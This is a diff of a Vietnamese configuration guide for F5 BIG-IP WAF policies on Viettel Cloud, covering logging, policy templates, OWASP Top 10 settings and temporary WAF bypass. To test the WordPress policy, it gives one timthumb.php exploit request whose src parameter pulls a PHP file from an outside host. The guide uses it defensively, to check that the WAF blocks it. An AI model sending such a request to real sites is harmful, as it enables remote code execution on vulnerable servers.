@@ -1,11 +1,10 @@
 # Advanced Web Application Firewall and API Protection
-## Giới thiệu tổng quan
+## I. Giới thiệu tổng quan
 Một trong những dịch vụ quan trọng mà F5 Services cung cấp trên nền tảng Viettel Cloud là dịch vụ bảo vệ lớp ứng dụng. Cụ thể ở đây là bảo vệ các ứng dụng web-based, một số thuật ngữ thường được sử dụng cho dịch vụ này là Web Application Firewall (WAF), hoặc Web Application and API Protection (WAAP)
-## Hướng dẫn cấu hình
-### Tìm hiểu môi trường, ứng dụng, các thiết lập cần thiết ban đầu
+## II. Hướng dẫn cấu hình
+### 1. Tìm hiểu môi trường, ứng dụng, các thiết lập cần thiết ban đầu
 
-#### Cấu hình lưu log các vi phạm
-Trên giao diện quản trị web của F5 BIG-IP, vào menu `Security` > `Event Logs` > `Logging Profiles`, bấm vào nút `Create`
+Trước hết, cần cấu hình lưu log các vi phạm, trên giao diện quản trị web của F5 BIG-IP, vào menu `Security` > `Event Logs` > `Logging Profiles`, bấm vào nút `Create`
 
 Tại màn hình tiếp theo:
 - Đặt tên cho profile, ví dụ `security_log_profile`
@@ -17,11 +16,11 @@ Nếu chọn mục `Bot Defense`, cần chọn ô `Local Publisher` trong tab t�
 
 Bấm vào `Create` để tạo log profile.
 
-### Tạo security policy
+### 2. Tạo security policy
 
 > Lưu ý: Trước khi tiến hành các bước dưới đây (với bất kỳ loại policy nào), cần đảm bảo rằng ứng dụng đang hoạt động với F5 BIG-IP đóng vai trò như thiết bị cân bằng tải, reverse proxy. Nghĩa là các cấu hình liên quan như DNS, node, pool, monitor, ssl, virtual server đều đang hoạt động đúng và người sử dụng có thể truy cập bình thường.
 
-#### I. Khởi tạo chính sách bảo mật chế độ triển khai theo loại ứng dụng (ví dụ Wordpress)
+#### a. Khởi tạo chính sách bảo mật chế độ triển khai theo loại ứng dụng (ví dụ Wordpress)
 Trường hợp này, người quản trị bảo mật đã có hiểu biết rằng ứng dụng mà mình đang thiếp lập chính sách bảo mật được phát triển dựa trên wordpress
 (https://vi.wordpress.org/). Không tiến hành các bước bên dưới nếu không phải.
 
@@ -38,7 +37,7 @@ Bấm vào nút `Save` để lưu lại. Như vậy, ứng dụng đã được 
 > Để kiểm tra xem chính sách bảo mật này có đang hoạt động hay không, có thể thử một dạng tấn công vào lỗ hổng bảo mật của Wordpress, ví dụ CVE-2014-4663 (https://blog.sucuri.net/2011/08/attacks-against-timthumb-php-in-the-wild-list-of-themes-and-plugins-being-scanned.html).
 Để thực hiện khai thác lỗ hổng, gửi một GET request tới đường dẫn `/wp-content/plugins/wordpress-gallery-plugin/timthumb.php?src=http://picasa.com12345.dyndns.org/1.php`. Nếu cấu hình thành công, hệ thống F5 BIG-IP sẽ chặn khai thác này, đưa ra một thông báo lỗi và kèm theo đó là một số `Support ID`, ghi nhận lại mã số này để tra cứu log. Truy cập vào giao diện quản trị F5 BIG-IP, vào mục `Security` > `Event Logs` > `Application` > `Requests`, nhập mã Support ID vào bộ lọc tìm kiếm, ta sẽ thấy một bản ghi log liên quan đến việc F5 BIG-IP chặn lại hành vi khai thác lỗ hổng bảo mật này.
 
-#### II. Khởi tạo chính sách bảo mật chế độ triển khai nhanh - Rapid deployment policy
+#### b. Khởi tạo chính sách bảo mật chế độ triển khai nhanh - Rapid deployment policy
 Trường hợp này, người quản trị hệ thống muốn cấu hình nhanh một chính sách bảo mật mà qua đó có thể áp dụng ngay, không mất quá nhiều thời gian cho hệ thống tự học (learn) cũng như giảm thiểu tình trạng false positive alarms.
 Nói chung, kiểu triển khai này có thể giải quyết được đa số các yêu cầu về bảo mật cho một ứng dụng web.
 
@@ -61,7 +60,7 @@ Bấm vào nút `Save` để lưu lại. Như vậy, ứng dụng đã được 
 
 Để xem chi tiết hơn về những thiết lập của dạng Rapid Deployment Policy, có thể truy cập vào `Security` > `Application Security` > `Policy Building` > `Learning and Blocking Settings` (chọn đúng tên policy, ví dụ: rapid_waf_policy)
 
-#### III. Khởi tạo chính sách bảo mật chế độ triển khai cơ bản - Fundamental
+#### c. Khởi tạo chính sách bảo mật chế độ triển khai cơ bản - Fundamental
 Trường hợp này, người quản trị mong muốn hệ thống F5 BIG-IP đưa ra các chính sách bảo mật tự động. Dựa vào lưu lượng thực tế F5 BIG-IP sẽ đưa ra các đánh giá và gợi ý và thậm chí tự động áp dụng các luật bảo vệ.
 
 Trên giao diện quản trị web của F5 BIG-IP, vào menu `Security` > `Application Security` > `Security Policies` > `Policies List`, bấm vào nút `Create`.
@@ -109,7 +108,7 @@ Ví dụ như hình minh hoạ dưới đây, hệ thống tự học được c
 
 Tương tự như với 2 loại tạo chính sách bảo mật ở trên, người quản trị cũng có thể kiểm thử việc chặn truy cập không hợp lệ bằng một số kiểu tấn công/khai thác nào đó (Command Injection, SQL Injection, Cross-site scripting..).
 
-#### IV. Khởi tạo chính sách bảo mật để chặn lọc các tấn công theo OWASP Top 10
+#### d. Khởi tạo chính sách bảo mật để chặn lọc các tấn công theo OWASP Top 10
 Trường hợp này, người quản trị bảo mật có mong muốn cấu hình các chính sách bảo mật nhằm ngăn chặn các tấn công được liệt kê trong danh sách Top 10 của OWASP.
 > Lưu ý: đây chỉ là các gợi ý, dẫn dắt (guide) của F5 BIG-IP về việc thiết lập một hệ thống WAF sao cho tuân thủ và chống lại được top 10 loại tấn công được liệt kê của tổ chức OWASP. Trong quá trình thiết lập, người quản trị cần **cân nhắc kỹ càng** mỗi khi cấu hình một mục nào đó. Đồng thời, có một số mục nằm ngoài hệ thống WAF này, nhưng vẫn là một mục cần phải làm để tuân thủ, hệ thống này **tin tưởng hoàn toàn** vào người quản trị khi đưa ra quyết định rằng: *"tôi đã thực hiện điều đó rồi"*.
 
@@ -213,19 +212,31 @@ Nếu đã, đang và sẽ thực hiện định kỳ đầy đủ các hạng m
 
 Thực hiện tuân thủ Top 10 OWASP là một nỗ lực tập thể, nhiều thành phần cùng phải thực hiện. Hệ thống F5 BIG-IP chỉ đóng vai trò dẫn hướng và cấu hình các cơ chế bảo mật nhất định mà nó kiểm soát được.
 
-#### V. Các cách thức bypass chức năng WAF
+#### e. Các cách thức bypass chức năng WAF
 Trong quá trình áp dụng các chính sách, luật bảo vệ, có thể có lúc cần phải bypass tạm thời việc này, ví dụ để troubleshoot dễ dàng hơn. Có 2 cách thực hiện trên thiết bị F5 BIG-IP
-1. Chuyển qua lại chế độ Blocking và Transparent
+
+**Chuyển qua lại chế độ Blocking và Transparent**
+
 Truy cập vào `Security` > `Application Security` > `Security Policies` > `Policies List` (chọn đúng tên policy đang cần tác động).
 ![security_policy_config](./security_policy_config.png "security_policy_config")
 Tại mục Enforcement Mode, chọn Transparent. Sau đó bấm nút `Save` và `Apply Policy`. Ở chế độ Transparent, hệ thống vẫn kiểm tra các truy cập, tuy nhiên sẽ không chặn ngay cả khi có vi phạm, có thể log lại các vi phạm này để người quản trị xem lại, phân tích.
 
-2. Chuyển qua lại chế độ bypass tính năng WAF
+**Chuyển qua lại chế độ bypass tính năng WAF**
+
 Vào menu `Local Traffic` > `Virtual Servers` > bấm vào `Virtual Server List`. 
 Sau đó, click chọn virtual server đang cần bypass. Tại màn hình tiếp theo, chọn Tab `Security` > `Policies`.
 Phần `Application Security Policy`, chọn `Disabled`.  
 ![bypass_waf](./bypass_waf.png "bypass_waf") 
 Với cách này, hệ thống F5 BIG-IP chỉ hoạt động đơn thuần như một thiết bị cân bằng tải hoặc reverse proxy, không có bất cứ một request nào được kiểm tra về mặt bảo mật. Mọi vi phạm cũng không được xem xét hay ghi log lại.
 
-## Liên hệ hỗ trợ
+### 3. Thiết lập các signatures, signatureSet
+### 4. Thiết lập chế độ chặn dựa vào địa chỉ IP theo khu vực địa lý
+### 5. Thiết lập chế độ chặn dựa vào địa chỉ IP độc hại
+### 6. Thiết lập chế độ chống tấn công dò quét mật khẩu
+### 7. Cấu hình các chế độ bảo vệ parameter
+### 8. Tính năng mã hóa dữ liệu trên trình duyệt
+### 9. Sao lưu và phục hồi chính sách bảo mật
+
+
+## III. Liên hệ hỗ trợ
 Yêu cầu hỗ trợ kỹ thuật xin gửi đến địa chỉ: techsupport@viettelcloud.vn
